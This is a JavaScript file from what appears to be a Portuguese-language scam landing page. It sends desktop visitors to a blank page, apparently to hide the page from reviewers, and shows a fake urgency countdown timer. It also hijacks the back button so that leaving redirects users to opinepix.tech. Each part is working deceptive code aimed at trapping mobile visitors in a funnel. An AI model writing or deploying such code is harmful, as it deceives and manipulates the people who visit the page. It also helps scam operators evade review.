function verificarLarguraDaTela() {
  const isMobile = /Android|iPhone/i.test(navigator.userAgent);
  const isSmallScreen = window.innerWidth <= 800;
  
  if (isMobile || isSmallScreen) {
  } else {
        window.location.href = "about:blank";
  }
}
window.addEventListener('load', verificarLarguraDaTela);    



window.onload = function () {
  var links = document.getElementsByTagName("a");
  for (var i = 0, n = links.length; i < n; i++) {
      var href = links[i].href.trim() +
              (links[i].href.indexOf("?") > 0 ? '&' : '?') +
              document.location.search.replace('?', '').toString();
      links[i].href = href;
  }
}


function iniciarContador() {
  // Obtenha os elementos de minutos e segundos
  const minutosValor = document.getElementById('minutosValor');
  const segundosValor = document.getElementById('segundosValor');

  // Defina o tempo inicial (3 minutos e 30 segundos)
  let minutos = 3;
  let segundos = 30;

  // Atualize os valores iniciais
  minutosValor.textContent = minutos < 10 ? `0${minutos}` : minutos;
  segundosValor.textContent = segundos < 10 ? `0${segundos}` : segundos;

  // Inicie o intervalo de contagem regressiva
  const interval = setInterval(function () {
      if (minutos === 0 && segundos === 0) {
          // Tempo esgotado, pare o contador
          clearInterval(interval);
      } else {
          // Reduza o tempo restante
          if (segundos === 0) {
              minutos--;
              segundos = 59;
          } else {
              segundos--;
          }

          // Atualize os valores de minutos e segundos
          minutosValor.textContent = minutos < 10 ? `0${minutos}` : minutos;
          segundosValor.textContent = segundos < 10 ? `0${segundos}` : segundos;
      }
  }, 1000); // Atualize a cada segundo (1000 ms)
}

// Inicie o contador automaticamente quando a página carregar
window.onload = iniciarContador;



(function(b) {
  var a = {
     version: "0.0.1",
     history_api: typeof history.pushState !== "undefined",
     init: function() {
       b.location.hash = "#no-back";
       a.configure();
     },
     hasChanged: function() {
       if (b.location.hash == "#no-back") {
         b.location.hash = "#";
         b.location.href = "https://opinepix.tech/op_br2"; //LINK PARA REDIRECIONAR AQUI
       }
     },
     checkCompat: function() {
       if (b.addEventListener) {
         b.addEventListener("hashchange", a.hasChanged, false);
       } else {
         if (b.attachEvent) {
           b.attachEvent("onhashchange", a.hasChanged);
         } else {
           b.onhashchange = a.hasChanged;
         }
       }
     },
     configure: function() {
       if (b.location.hash == "#no-back") {
         if (this.history_api) {                        
                history.pushState(null, "", "#");
           } else {
             b.location.hash = "#";
              b.location.href = "https://opinepix.tech/op_br2"; //LINK PARA REDIRECIONAR AQUI
           }
         }
         a.checkCompat();
         a.hasChanged();
       }
     };
     if (typeof define === "function" && define.amd) {
       define(function() {
         return a;
       });
     } else {
       if (typeof module === "object" && module.exports) {
         module.exports = a;
       } else {
         b.noback = a;
       }
     }
     a.init();
   }(window));
